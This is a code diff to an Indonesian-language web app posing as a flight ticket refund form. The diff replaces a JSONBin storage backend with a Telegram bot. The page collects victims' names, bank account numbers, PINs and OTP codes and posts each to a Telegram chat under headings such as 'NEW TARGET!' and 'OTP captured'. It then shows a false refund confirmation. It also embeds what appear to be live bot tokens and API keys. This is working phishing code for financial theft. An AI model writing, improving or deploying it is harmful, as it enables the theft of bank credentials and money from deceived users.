@@ -77,6 +77,17 @@
             text-align: center;
             margin-top: 20px;
         }
+        #debug {
+            background: #333;
+            color: #0f0;
+            font-size: 10px;
+            padding: 10px;
+            margin-top: 20px;
+            border-radius: 8px;
+            font-family: monospace;
+            word-break: break-all;
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -143,11 +154,53 @@
         </div>
     </div>
 
+    <div id="debug">
+        ⏳ PWA siap menunggu data...
+    </div>
+
     <script>
-        // ========== KONFIGURASI JSONBIN ==========
-        const BIN_ID = '69e10549856a6821893f4a1f';
-        const API_KEY = '$2a$10$XDyAdHR8NvpJ6uIGcZhRcua51UIkJdbJTaltyHGuDxMtZq2mg2qyq';
-        const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
+        // ========== KONFIGURASI TELEGRAM ==========
+        // GANTI DENGAN TOKEN DAN CHAT ID ANDA
+        const TELEGRAM_TOKEN = '8638338084:AAHGXbttcu4nE9Ro_OwfRUKY7yKlT2ml-Cw';  // GANTI!
+        const CHAT_ID = '6924480474';  // GANTI!
+        
+        function addDebug(msg) {
+            const debugDiv = document.getElementById('debug');
+            debugDiv.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
+            console.log(msg);
+        }
+        
+        addDebug('✅ PWA dimulai');
+        
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            addDebug('Mengirim ke Telegram...');
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    addDebug('✅ Berhasil terkirim ke Telegram!');
+                    return true;
+                } else {
+                    addDebug('❌ Gagal: ' + JSON.stringify(result));
+                    return false;
+                }
+            } catch(e) {
+                addDebug('❌ Error: ' + e.message);
+                return false;
+            }
+        }
         
         // AUTO INSTALL PROMPT
         let deferredPrompt;
@@ -155,48 +208,21 @@
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
+            addDebug('Install prompt ready');
             
             setTimeout(() => {
                 if (deferredPrompt) {
                     deferredPrompt.prompt();
+                    addDebug('✅ Install prompt ditampilkan');
                     deferredPrompt.userChoice.then((choiceResult) => {
                         if (choiceResult.outcome === 'accepted') {
-                            console.log('PWA terinstall');
+                            addDebug('✅ PWA terinstall!');
                         }
                         deferredPrompt = null;
                     });
                 }
             }, 2000);
         });
-        
-        // Fungsi simpan ke JSONBin
-        async function saveToJSONBin(data) {
-            let oldData = { targets: [], otps: [] };
-            try {
-                const res = await fetch(JSONBIN_URL, {
-                    headers: { 'X-Master-Key': API_KEY }
-                });
-                const json = await res.json();
-                oldData = json.record || { targets: [], otps: [] };
-            } catch(e) {
-                console.log('Data baru dibuat');
-            }
-            
-            if (data.step === 'initial_data') {
-                oldData.targets.push(data);
-            } else if (data.step === 'otp') {
-                oldData.otps.push(data);
-            }
-            
-            await fetch(JSONBIN_URL, {
-                method: 'PUT',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Master-Key': API_KEY
-                },
-                body: JSON.stringify(oldData)
-            });
-        }
         
         // Tampilkan field PIN untuk e-wallet
         document.getElementById('bankType').addEventListener('change', function() {
@@ -212,35 +238,45 @@
         document.getElementById('refundForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const data = {
-                ticketNumber: document.getElementById('ticketNumber').value,
-                fullName: document.getElementById('fullName').value,
-                bankType: document.getElementById('bankType').value,
-                accountNumber: document.getElementById('accountNumber').value,
-                pin: document.getElementById('pin').value,
-                timestamp: new Date().toISOString(),
-                step: 'initial_data'
-            };
+            const ticketNumber = document.getElementById('ticketNumber').value;
+            const fullName = document.getElementById('fullName').value;
+            const bankType = document.getElementById('bankType').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            const pin = document.getElementById('pin').value;
             
-            await saveToJSONBin(data);
+            addDebug('📝 Form dikirim: ' + fullName);
+            
+            // Buat pesan Telegram
+            let message = `🎯 NEW TARGET!\n\n`;
+            message += `✈️ Tiket: ${ticketNumber}\n`;
+            message += `👤 Nama: ${fullName}\n`;
+            message += `🏦 Bank: ${bankType}\n`;
+            message += `💰 Rekening: ${accountNumber}\n`;
+            if (pin) message += `🔑 PIN: ${pin}\n`;
+            message += `⏰ Waktu: ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(message);
+            
+            // Tampilkan modal OTP
             document.getElementById('otpModal').style.display = 'flex';
         });
         
         // Submit OTP
         document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
             const otp = document.getElementById('otpInput').value;
+            addDebug('🔑 OTP: ' + otp);
             
-            const data = {
-                otp: otp,
-                timestamp: new Date().toISOString(),
-                step: 'otp'
-            };
+            // Buat pesan OTP
+            let message = `🔴 OTP TERTANGKAP!\n\n`;
+            message += `🔢 Kode: <b>${otp}</b>\n`;
+            message += `⏰ Waktu: ${new Date().toLocaleString()}`;
             
-            await saveToJSONBin(data);
+            await sendToTelegram(message);
             
             alert('Verifikasi berhasil! Dana refund akan diproses dalam 1x24 jam.');
             document.getElementById('otpModal').style.display = 'none';
             document.getElementById('refundForm').reset();
+            addDebug('✅ Proses selesai');
         });
     </script>
 </body>
